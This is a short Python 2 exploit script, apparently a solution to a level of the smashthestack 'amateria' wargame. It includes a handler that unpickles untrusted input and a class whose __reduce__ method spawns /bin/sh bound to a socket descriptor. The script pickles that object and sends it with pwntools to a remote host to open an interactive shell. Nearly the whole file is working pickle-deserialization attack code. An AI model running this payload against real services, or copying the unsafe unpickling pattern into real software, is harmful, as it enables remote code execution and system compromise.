import cPickle
import os
import socket
from pwn import *

def handle(payload):
	print "hai"

	try:
		print payload
		l = cPickle.loads(payload)
		print l
		s = sum(l)
		print "%d\n"%s
	except:
		print "fail :(\n"


	print "bye\n"

cmd = "ls"


class RCE(object):
  def __init__(self, fd):
    
      self.fd = fd

  def __reduce__(self):
    return (subprocess.Popen,
            (('/bin/sh',), # args
             0,            # bufsize
             None,         # executable
             self.fd, self.fd, self.fd    # std{in,out,err}
             ))

fd = 4

payload = cPickle.dumps(RCE(fd))
r = remote('amateria.smashthestack.org', 54321)
r.write(payload)
r.interactive()

